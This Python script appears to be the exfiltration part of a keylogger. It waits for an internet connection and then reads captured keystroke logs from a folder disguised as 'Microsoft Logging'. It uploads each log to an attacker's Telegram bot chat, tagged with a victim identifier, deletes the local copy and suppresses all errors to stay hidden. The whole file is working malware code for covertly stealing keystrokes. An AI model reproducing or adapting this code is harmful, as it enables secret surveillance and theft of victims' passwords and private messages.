import os
import time
import requests
import telegram
from getmac import get_mac_address as gma
from config import Config as BOT_SETTING


while(True):
    try:
        request = requests.get("http://www.google.com")
        # print("Connected to the Internet")
        break
    except:
        time.sleep(10)
        # print("No internet connection.")
try:
    local_keylogs = os.listdir("C:\\Microsoft Logging\\Logs\\")
    device_mac = gma()

    with open("C:\\Microsoft Logging\\Microsoft Service.logs", "r") as pc_id:
        identific = pc_id.read()

    for files in local_keylogs:
        if (os.stat(f"C:\\Microsoft Logging\\Logs\\{files}").st_size != 0):
            with open(f"C:\\Microsoft Logging\\Logs\\{files}", 'rb') as file:
                caption = f"#{identific} {files[:-5]}"
                bot_auth = telegram.Bot(token = BOT_SETTING.TOKEN)
                telegram.Bot.sendDocument(bot_auth, chat_id = BOT_SETTING.CHAT_ID, document = file, filename = f"{files[:-4]}txt", caption = caption)
            os.remove(f"C:\\Microsoft Logging\\Logs\\{files}")
except:
    pass